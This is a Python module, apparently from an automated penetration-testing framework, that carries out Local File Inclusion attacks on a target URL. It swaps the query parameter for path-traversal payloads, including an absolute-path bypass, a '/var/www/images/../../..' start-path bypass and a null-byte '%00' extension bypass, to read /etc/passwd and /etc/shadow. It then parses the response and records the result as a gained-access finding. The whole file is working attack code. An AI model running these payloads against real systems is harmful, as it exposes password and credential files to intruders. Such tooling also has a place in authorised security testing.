"""
Module responsible for performing Local File Inclusion attack.
It takes care of detecting if LFI is possible and if it is, it tries to exploit it
with a couple of different methods.
"""
import uuid
from typing import List
from urllib.parse import urlparse, urlunparse, ParseResult

import celery  # type: ignore

from config.settings import LFI, GAIN_ACCESS_PHASE, lfi_logger, LFI_REQUEST_METHOD
from modules.task_queue.tasks import lfi_web_request, pass_result_event
from utils.abstracts_classes import AbstractModule
from utils.custom_dataclasses import ResultEvent
from utils.redis_utils import store_module_results_in_database
from utils.utils import (
    convert_list_or_set_to_dict,
    extract_passwd_file_content_from_web_response,
)

logger = lfi_logger


class LocalFileInclusion(AbstractModule):
    request_method = LFI_REQUEST_METHOD
    files_to_exploit = {"/etc/passwd", "/etc/shadow"}

    def __init__(self, target: str) -> None:
        super().__init__()
        self.target: str = target
        self.methods = [
            self._absolute_path_bypass,
            self._start_path_validation_bypass,
            self._extension_validation_bypass,
        ]

    def run(self):
        """
        Main function responsible for launching detection and different methods of exploitation.
        """
        # TODO: figure out if auto detection of URL that is LFI exploitable is possible
        parsed_url = urlparse(self.target)

        for method in self.methods:
            finding = False

            for file_path in self.files_to_exploit:
                query = method(
                    file_path=file_path,
                    current_query=parsed_url.query,
                )

                if self._make_request(parsed_url=parsed_url, query=query):
                    finding = True
                    break

            if finding:
                break

    @staticmethod
    def _absolute_path_bypass(file_path: str, current_query: str) -> str:
        """
        Function to bypass LFI with absolute path.
        """
        current_filename = current_query.split("=")[-1]

        return current_query.replace(current_filename, f"/../../../../../..{file_path}")

    @staticmethod
    def _start_path_validation_bypass(file_path: str, current_query: str) -> str:
        """
        Function to bypass LFI with start path validation.
        """
        current_filename = current_query.split("=")[-1]

        return current_query.replace(
            current_filename, f"/var/www/images/../../../../../..{file_path}"
        )

    @staticmethod
    def _extension_validation_bypass(file_path: str, current_query: str) -> str:
        """
        Function to bypass LFI with extension validation.
        """
        current_filename = current_query.split("=")[-1]

        return current_query.replace(
            current_filename, f"/../../../../../..{file_path}%00"
        )

    def _make_request(
        self,
        parsed_url,
        query: str,
    ) -> bool:
        """
        Function launching web request task.
        """
        target = urlunparse(
            ParseResult(
                scheme=parsed_url.scheme,
                netloc=parsed_url.netloc,
                path=parsed_url.path,
                params=parsed_url.params,
                query=query,
                fragment=parsed_url.fragment,
            )
        )
        response = lfi_web_request.delay(
            request_method=self.request_method,
            target=target,
            allow_redirects=True,
        )
        task_results = response.get()
        results = extract_passwd_file_content_from_web_response(response=task_results)

        if results:
            self._pass_results(results=results)
            self._save_module_results(results=results)
            return True

        return False

    def _save_module_results(self, results: List[str]) -> None:
        """
        Function to save results.
        """
        results_for_db = convert_list_or_set_to_dict(list_of_items=results)
        store_module_results_in_database(
            target=self.target,
            results=results_for_db,
            phase=GAIN_ACCESS_PHASE,
            module=LFI,
        )

    def _pass_results(self, results: List[str]) -> None:
        """
        Function launching result event.
        """
        events = (
            pass_result_event.s(
                event=ResultEvent(
                    id=uuid.uuid4(),
                    source_module=LFI,
                    target=self.target,
                    result=result,
                )
            )
            for result in results
        )
        celery.group(events).apply_async()
